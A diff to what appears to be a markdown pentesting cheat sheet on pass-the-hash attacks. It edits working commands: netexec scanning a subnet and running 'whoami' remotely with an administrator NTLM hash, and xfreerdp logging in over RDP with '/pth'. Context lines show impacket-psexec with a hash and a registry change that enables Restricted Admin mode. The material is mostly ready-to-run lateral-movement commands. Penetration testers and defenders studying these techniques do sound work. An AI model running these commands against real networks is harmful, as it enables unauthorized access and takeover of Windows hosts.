@@ -44,7 +44,7 @@ impacket-psexec administrator@192.168.1.20 -hashes :1A2B3C4D5E6F7890ABCDEF123456
 **Scan a subnet:**
 
 ```bash
-netexec smb 192.168.1.0/24 -u Administrator -d . -H 1A2B3C4D5E6F7890ABCDEF1234567890
+netexec smb 192.168.1.0/24 -u Administrator -H 1A2B3C4D5E6F7890ABCDEF1234567890
 ```
 
 - `Pwn3d!` indicates success.
@@ -53,7 +53,7 @@ netexec smb 192.168.1.0/24 -u Administrator -d . -H 1A2B3C4D5E6F7890ABCDEF123456
 **Execute command remotely:**
 
 ```bash
-netexec smb 192.168.1.20 -u Administrator -d . -H 1A2B3C4D5E6F7890ABCDEF1234567890 -x whoami
+netexec smb 192.168.1.20 -u Administrator -H 1A2B3C4D5E6F7890ABCDEF1234567890 -x whoami
 ```
 
 ---
@@ -84,7 +84,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 - Allows **GUI access** using NTLM hash.
 
 ```bash
-xfreerdp /u:<username> /p:<password> /v:<target_ip> /dynamic-resolution
+xfreerdp /u:<username> /pth:<HASH> /v:<target_ip> /dynamic-resolution
 ```
 
 ---
